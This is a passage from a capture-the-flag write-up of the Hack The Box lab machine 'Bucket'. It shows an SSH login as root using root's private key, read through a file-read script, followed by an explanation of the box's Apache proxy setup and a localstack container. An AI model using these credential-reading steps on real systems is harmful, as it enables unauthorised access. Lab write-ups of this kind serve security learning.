ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHpWmEozLG6uOV2Zvp3LU5KfQP126YUBQJ5KggLCGGyr59p3HbVJRtCv+6eh8quaA0wCGOascKIxqmYPDV1zKPg9I+3Cjoi+tXQa7K7fgtrDURq/2xXWGDMMubz20AHt+HYk3w4H/h23SxbEfHNZ8KYcXkMFZKXF2T4rgfa8n55MDYXFPa14s+Yl3sb2a9qeHVW1y2kI6Lr4Ixy/Ugy90W0EtuJ599MA4XWtIl2zibTQymqrAOJB2A3mCFw65tNeLdxuPP24JMG1c7Z1wt8cCqGphJrt4zTHmnBfngev1I/SomnnLS56tqI52hIkPlKaAF8h8LNQNkAyd17dgZnRDhrzoFWCwPZWXnj72Ggs5gyyJX2DhLvr4+YGK7CL9avG2jLOvf+G0lWYKmb5Z86vhBBnIIUBWjbWwt8ioxw8GqW6vkW+ta1RQIDS6x/H+PjRX+XlYAiKgg5fReZfSSWXV/o/vX538FcBA2/K39o56edp+C/OyPbfDmbiw5ME06AGU= root@ubuntu

```

I’ll grab the private key and get a shell:

```

root@kali# ./get_file.sh /root/.ssh/id_rsa > ~/keys/bucket_root
root@kali# chmod 600 ~/keys/bucket_root
root@kali# ssh -i ~/keys/bucket_root root@10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 04 Feb 2021 03:01:44 PM UTC

  System load:                      0.27
  Usage of /:                       40.0% of 19.56GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        183
  Users logged in:                  1
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:82a7

91 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Oct 13 10:25:01 2020
root@bucket:~#

```

## Beyond Root

I was curious as to why I was able to connect to the DB on localhost:4566 using the `aws` client from my host. 4566 wasn’t exposed publicly on Bucket, but rather I used the `--endpoint-url http://s3.bucket.htb`.

The apache config (with comments removed) looks like this:

```

<VirtualHost 127.0.0.1:8000>
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>
<VirtualHost *:80>
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
</VirtualHost>
<VirtualHost *:80>
        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <Proxy *>
                 Order deny,allow
                 Allow from all
         </Proxy>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

The first virtual host is routing for the localhost server on port 8000.

The second one is looking at all traffic that doesn’t have a host ending in `bucket.htb` and returning 302 to `http://bucket.htb/`. It’s also serving the default `/var/www/html`.

The third server is for `s3.bucket.htb`, and it will proxy everything to `http://localhost:4566`.

What is running on 4566? `netstat` gives the process as `docker-proxy`:

```

root@bucket:/# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:38255         0.0.0.0:*               LISTEN      923/containerd      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      644/systemd-resolve 
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      1382/docker-proxy   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      997/sshd: /usr/sbin 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1029/apache2        
tcp6       0      0 :::80                   :::*                    LISTEN      1029/apache2        
tcp6       0      0 :::22                   :::*                    LISTEN      997/sshd: /us

```

Looking at the running containers, it’s a container called `localstack`:

```

root@bucket:/# docker ps
CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS                                               NAMES
444af250749d        localstack/localstack:latest   "docker-entrypoint.sh"   6 months ago        Up 50 minutes       4567-4597/tcp, 127.0.0.1:4566->4566/tcp, 8080/tcp   localsta

```

[localstack](https://github.com/localstack/localstack) is a local AWS cloud stack, designed for developers to develop and test cloud / serverless applications offline. It has a routes which listens on 4566, and manages all the requests to the correct service. This is a really neat way to bring the AWS testing experience to HTB!

[More Beyond Root »](/2021/05/03/more-bucket-beyond-root.html)